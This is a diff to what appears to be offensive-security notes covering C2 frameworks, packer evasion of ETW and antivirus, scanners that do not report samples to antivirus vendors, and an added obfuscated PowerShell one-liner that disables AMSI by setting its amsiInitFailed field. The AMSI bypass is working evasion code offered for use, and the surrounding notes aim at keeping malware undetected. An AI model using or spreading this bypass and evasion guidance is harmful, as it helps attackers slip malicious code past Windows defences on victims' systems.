@@ -4,8 +4,8 @@
 
 ### C2
 
-- [Covenant](https://github.com/cobbr/Covenant) (favorite so far)
-- [Cobalt Strike](https://www.cobaltstrike.com/) (not free :/)
+- [Covenant](https://github.com/cobbr/Covenant) 
+- [Cobalt Strike](https://www.cobaltstrike.com/)
 - Metasploit (Without meterpreter ^^)
 
 ### Packer
@@ -17,7 +17,15 @@
 	- bypass ETW and Process Hollowing detection
 	- Bypass specific AV and ERD dll 
 
----
+### Not distributed to online AV 
+- [antiscan.me](https://antiscan.me)
+- [nodistribute](https://nodistribute.com/)
+
+### AMSI Bypass
+
+```sh
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
 
 ### Full PoC (Auto)
 
